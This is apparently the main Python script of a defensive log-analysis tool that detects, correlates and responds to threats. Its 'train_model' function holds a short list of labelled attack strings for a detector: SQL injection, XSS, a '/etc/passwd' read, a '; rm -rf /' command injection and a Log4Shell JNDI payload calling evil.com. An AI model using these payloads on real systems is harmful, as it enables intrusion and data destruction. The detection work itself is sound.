#!/usr/bin/env python3
import asyncio
import argparse
import sys
import os
import logging
import time
from datetime import datetime
from typing import Dict, List, Any, Optional
import yaml
import json
from pathlib import Path

# Add src to path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))

from src.parser import LogParser
from src.normalizer import LogNormalizer
from src.detector import ThreatDetector
from src.correlator import EventCorrelator
from src.responder import ActionBus
from src.config import ConfigManager

class LogAnalyzer:
    def __init__(self, config_path: str = "config.yml"):
        self.config_manager = ConfigManager(config_path)
        self.config = self.config_manager.load_config()
        self.setup_logging()

        # Initialize components
        self.parser = LogParser(self.config)
        self.normalizer = LogNormalizer(self.config)
        self.detector = ThreatDetector(self.config)
        self.correlator = EventCorrelator(self.config)
        self.responder = ActionBus(self.config)

        # Metrics
        self.metrics = {
            'total_lines': 0,
            'parsed_lines': 0,
            'threat_events': 0,
            'actions_taken': 0,
            'start_time': None,
            'end_time': None,
            'errors': []
        }

    def setup_logging(self):
        """Setup logging configuration"""
        log_level = self.config.get('system', {}).get('log_level', 'INFO')
        logging.basicConfig(
            level=getattr(logging, log_level),
            format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
            handlers=[
                logging.StreamHandler(sys.stdout),
                logging.FileHandler('analyzer.log')
            ]
        )
        self.logger = logging.getLogger(__name__)

    async def process_event(self, raw_event: Dict[str, Any]) -> Optional[Dict[str, Any]]:
        """Process a single event through the pipeline"""
        try:
            # Normalize event
            normalized_event = self.normalizer.normalize_event(raw_event)
            if not normalized_event:
                return None

            # Detect threats
            detection_result = self.detector.detect_threats(normalized_event)

            # Only process events with threats
            if not detection_result.threat_types:
                return None

            # Correlate event
            correlated_event = self.correlator.process_correlation_result(
                normalized_event, detection_result
            )

            if not correlated_event:
                return None

            # Execute actions
            actions = await self.responder.process_correlated_event(
                normalized_event, correlated_event
            )

            # Write signal
            await self.responder.write_signal_to_file(normalized_event, correlated_event)

            # Update metrics
            self.metrics['threat_events'] += 1
            self.metrics['actions_taken'] += len(actions)

            return {
                'normalized_event': normalized_event,
                'detection_result': detection_result,
                'correlated_event': correlated_event,
                'actions': actions
            }

        except Exception as e:
            self.logger.error(f"Error processing event: {e}")
            self.metrics['errors'].append(str(e))
            return None

    async def process_file(self, file_path: str, tenant: Optional[str] = None) -> Dict[str, Any]:
        """Process log file"""
        self.logger.info(f"Processing file: {file_path}")
        self.metrics['start_time'] = datetime.now()

        try:
            # Parse file
            for raw_event in self.parser.parse_file(file_path):
                self.metrics['total_lines'] += 1

                # Apply tenant filter if specified
                if tenant and raw_event.get('tenant') != tenant:
                    continue

                # Process event
                result = await self.process_event(raw_event)
                if result:
                    self.metrics['parsed_lines'] += 1

                # Print progress
                if self.metrics['total_lines'] % 1000 == 0:
                    self.logger.info(f"Processed {self.metrics['total_lines']} lines...")

        except Exception as e:
            self.logger.error(f"Error processing file: {e}")
            self.metrics['errors'].append(str(e))

        self.metrics['end_time'] = datetime.now()
        return self.get_final_metrics()

    async def process_stream(self, stream, tenant: Optional[str] = None) -> Dict[str, Any]:
        """Process log stream from stdin"""
        self.logger.info("Processing stream input...")
        self.metrics['start_time'] = datetime.now()

        try:
            for line in stream:
                line = line.decode('utf-8').strip()
                if not line:
                    continue

                self.metrics['total_lines'] += 1

                # Parse line
                try:
                    raw_events = [self.parser.parse_line(line)]
                except Exception as e:
                    self.logger.warning(f"Failed to parse line: {e}")
                    continue

                # Process events
                for raw_event in raw_events:
                    # Apply tenant filter if specified
                    if tenant and raw_event.get('tenant') != tenant:
                        continue

                    result = await self.process_event(raw_event)
                    if result:
                        self.metrics['parsed_lines'] += 1

                # Print progress periodically
                if self.metrics['total_lines'] % 100 == 0:
                    self.logger.info(f"Processed {self.metrics['total_lines']} lines...")

        except KeyboardInterrupt:
            self.logger.info("Stream processing interrupted by user")
        except Exception as e:
            self.logger.error(f"Error processing stream: {e}")
            self.metrics['errors'].append(str(e))

        self.metrics['end_time'] = datetime.now()
        return self.get_final_metrics()

    def get_final_metrics(self) -> Dict[str, Any]:
        """Generate final metrics report"""
        if not self.metrics['start_time'] or not self.metrics['end_time']:
            return {}

        duration = (self.metrics['end_time'] - self.metrics['start_time']).total_seconds()

        # Calculate throughput
        throughput = self.metrics['total_lines'] / duration if duration > 0 else 0

        # Get component stats
        detector_stats = self.detector.get_rule_stats()
        correlator_stats = self.correlator.get_correlation_stats()
        responder_stats = self.responder.get_action_stats()

        metrics = {
            'throughput_lps': round(throughput, 2),
            'duration_seconds': round(duration, 2),
            'total_lines': self.metrics['total_lines'],
            'parsed_lines': self.metrics['parsed_lines'],
            'threat_events': self.metrics['threat_events'],
            'actions_taken': self.metrics['actions_taken'],
            'error_count': len(self.metrics['errors']),
            'rule_hits': sum(detector_stats.values()),
            'correlation_stats': correlator_stats,
            'action_stats': responder_stats,
            'start_time': self.metrics['start_time'].isoformat(),
            'end_time': self.metrics['end_time'].isoformat()
        }

        # Write metrics to file
        try:
            with open(self.config.get('output', {}).get('metrics_file', 'out/metrics.json'), 'w') as f:
                json.dump(metrics, f, indent=2)
        except Exception as e:
            self.logger.error(f"Failed to write metrics file: {e}")

        return metrics

    def print_summary(self, metrics: Dict[str, Any]):
        """Print processing summary"""
        print("\n" + "="*60)
        print("LOG ANALYSIS SUMMARY")
        print("="*60)
        print(f"Total Lines Processed: {metrics.get('total_lines', 0):,}")
        print(f"Lines Successfully Parsed: {metrics.get('parsed_lines', 0):,}")
        print(f"Threat Events Detected: {metrics.get('threat_events', 0):,}")
        print(f"Actions Taken: {metrics.get('actions_taken', 0):,}")
        print(f"Processing Duration: {metrics.get('duration_seconds', 0):.2f} seconds")
        print(f"Throughput: {metrics.get('throughput_lps', 0):,.2f} lines/second")
        print(f"Errors: {metrics.get('error_count', 0)}")

        if metrics.get('rule_hits'):
            print(f"Rule Matches: {metrics['rule_hits']}")

        if metrics.get('correlation_stats', {}).get('correlation_rate'):
            print(f"Correlation Rate: {metrics['correlation_stats']['correlation_rate']:.2%}")

        if metrics.get('action_stats', {}).get('success_rate'):
            print(f"Action Success Rate: {metrics['action_stats']['success_rate']:.2%}")

        print("="*60)

async def train_model(args):
    """Train ML model"""
    config_manager = ConfigManager(args.config)
    config = config_manager.load_config()

    detector = ThreatDetector(config)

    # Generate training data (in real implementation, load from files)
    print("Generating training data...")

    # This is a simplified training example
    # In production, you would load real labeled data
    malicious_samples = [
        "SELECT * FROM users WHERE id = 1 OR 1=1",
        "UNION SELECT username, password FROM users",
        "<script>alert('xss')</script>",
        "/etc/passwd",
        "; rm -rf /",
        "${jndi:ldap://evil.com/a}"
    ]

    benign_samples = [
        "GET /index.html HTTP/1.1",
        "POST /login HTTP/1.1",
        "SELECT name FROM users WHERE id = 1",
        "/home/user/document.pdf",
        "curl https://example.com"
    ]

    texts = malicious_samples + benign_samples
    labels = [1] * len(malicious_samples) + [0] * len(benign_samples)

    print(f"Training with {len(texts)} samples...")
    result = detector.train_ml_model(texts, labels)

    if result['status'] == 'success':
        print("Training completed successfully!")
        print(f"Accuracy: {result['accuracy']:.3f}")
        print(f"Precision: {result['precision']:.3f}")
        print(f"Recall: {result['recall']:.3f}")
        print(f"F1-Score: {result['f1']:.3f}")
    else:
        print(f"Training failed: {result['message']}")

def main():
    parser = argparse.ArgumentParser(description="Log Risk Detection and Auto-Remediation System")
    parser.add_argument('--config', '-c', default='config.yml', help='Configuration file path')
    parser.add_argument('--mode', choices=['fast', 'balanced', 'accurate'], default='balanced',
                       help='Processing mode (affects performance vs accuracy)')
    parser.add_argument('--tenant', '-t', help='Filter by tenant')
    parser.add_argument('--window', '-w', type=int, help='Correlation window in seconds')
    parser.add_argument('--no-ml', action='store_true', help='Disable machine learning detection')
    parser.add_argument('--seed', type=int, help='Random seed for reproducible results')

    subparsers = parser.add_subparsers(dest='command', help='Available commands')

    # Analyze command
    analyze_parser = subparsers.add_parser('analyze', help='Analyze log files')
    analyze_parser.add_argument('--file', '-f', help='Log file to analyze')
    analyze_parser.add_argument('--stdin', action='store_true', help='Read from stdin')

    # Train command
    train_parser = subparsers.add_parser('train', help='Train ML model')

    args = parser.parse_args()

    if not args.command:
        parser.print_help()
        sys.exit(1)

    # Load and modify config based on args
    config_manager = ConfigManager(args.config)
    config = config_manager.load_config()

    # Apply command line overrides
    if args.tenant:
        config['tenant'] = args.tenant
    if args.window:
        config['correlator']['window_seconds'] = args.window
    if args.no_ml:
        config['detector']['enable_ml'] = False
    if args.seed:
        config['system']['random_seed'] = args.seed

    # Apply mode settings
    if args.mode == 'fast':
        config['detector']['enable_ml'] = False
        config['correlator']['window_seconds'] = 30
    elif args.mode == 'accurate':
        config['detector']['enable_ml'] = True
        config['correlator']['window_seconds'] = 120

    # Update config
    config_manager.update_config(config)

    if args.command == 'train':
        asyncio.run(train_model(args))
    elif args.command == 'analyze':
        analyzer = LogAnalyzer(args.config)

        if args.stdin:
            # Stream processing
            metrics = asyncio.run(analyzer.process_stream(sys.stdin.buffer, args.tenant))
        elif args.file:
            # File processing
            if not os.path.exists(args.file):
                print(f"Error: File not found: {args.file}")
                sys.exit(1)

            metrics = asyncio.run(analyzer.process_file(args.file, args.tenant))
        else:
            print("Error: Either --file or --stdin must be specified")
            sys.exit(1)

        # Print summary
        analyzer.print_summary(metrics)

        # Exit with appropriate code
        sys.exit(0 if metrics.get('error_count', 0) == 0 else 1)

if __name__ == "__main__":
    main()